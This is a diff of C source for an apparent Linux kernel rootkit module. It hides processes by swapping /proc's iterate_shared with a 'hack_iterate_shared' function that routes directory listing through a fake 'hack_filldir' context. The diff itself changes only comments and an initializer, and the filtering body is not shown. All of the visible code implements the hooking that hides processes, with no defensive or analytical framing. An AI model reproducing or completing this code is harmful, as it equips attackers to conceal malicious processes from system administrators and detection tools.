@@ -11,7 +11,7 @@ static struct dir_context *backup_ctx; // backup /proc 's original dir_context(c
 static const struct file_operations *backup_fops; // backup /proc 's original fops (containing the iterate_shared function that is called on the inode when opening)
 static struct inode *proc_inode; // placeholder for the inode of /proc
 static struct file_operations proc_fops; // placeholder for the fops of /proc
-static int hide_process_active = 0; // active switch
+static int hide_process_active = 0; // hide_process activation flag
 
 
 // function to replace the original filldir, same type as filldir_t
@@ -28,11 +28,11 @@ struct dir_context fake_ctx = {
     .actor = hack_filldir,
 };
 
-/* fake iterate shared function, copy the position of the context in file, store the original to be used in our filldir, 
+/* the fake iterate shared function, copy the position of the context in file, store the original to be used in our filldir, 
 pass the fake context to the original iterate_shared where our filldir will be called,
 set the original context's position relative to dir to the new one after the fake filldir was called*/
 static int hack_iterate_shared(struct file *file, struct dir_context *ctx){
-    int result = 0;
+    int result;
     fake_ctx.pos = ctx->pos;
     backup_ctx = ctx;
     result = backup_fops->iterate_shared(file, &fake_ctx);
